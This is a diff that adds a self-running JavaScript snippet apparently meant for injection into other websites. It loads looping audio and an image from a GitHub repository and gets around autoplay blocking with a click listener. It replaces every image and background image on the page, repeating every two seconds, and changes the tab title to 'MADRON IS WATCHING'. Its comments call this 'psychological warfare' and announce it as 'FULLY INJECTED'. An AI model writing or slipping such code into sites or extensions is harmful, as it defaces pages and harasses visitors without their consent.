@@ -1,0 +1,44 @@
+(function() {
+    /* 1. INITIALIZE THE PSYCHOLOGICAL WARFARE */
+    const madronAudio = new Audio('https://raw.githubusercontent.com/FreshAssassin/Project-Nebula/main/lv_0_20260317155018.mp3');
+    const madronImg = 'https://raw.githubusercontent.com/FreshAssassin/Project-Nebula/main/c6efcb98-b4dd-484f-88ce-31d3f6b123e5.jpg';
+
+    // Set audio to loop and play
+    madronAudio.loop = true;
+    madronAudio.play().catch(e => {
+        console.log("Madron requires a click on the page to trigger audio.");
+        // Fallback for browsers that block auto-play
+        document.addEventListener('click', () => madronAudio.play(), { once: true });
+    });
+
+    /* 2. TRANSFORM THE DOM (IMAGE SWAP) */
+    const infectImages = () => {
+        // Target all standard images
+        document.querySelectorAll('img').forEach(img => {
+            if (img.src !== madronImg) {
+                img.src = madronImg;
+                img.srcset = ''; // Clear modern responsive images
+            }
+        });
+
+        // Target background images in divs/sections
+        document.querySelectorAll('div, section, a, span').forEach(el => {
+            const bg = window.getComputedStyle(el).backgroundImage;
+            if (bg !== 'none' && !bg.includes('madron')) {
+                el.style.backgroundImage = `url(${madronImg})`;
+                el.style.backgroundSize = 'cover';
+            }
+        });
+    };
+
+    // Run immediately
+    infectImages();
+
+    // Set an interval to catch new images (for sites like YouTube/Twitter that load as you scroll)
+    setInterval(infectImages, 2000);
+
+    /* 3. OPTIONAL: TAB HIJACK */
+    document.title = "😡 MADRON IS WATCHING";
+    
+    console.log("Madron Protocol: FULLY INJECTED.");
+})();
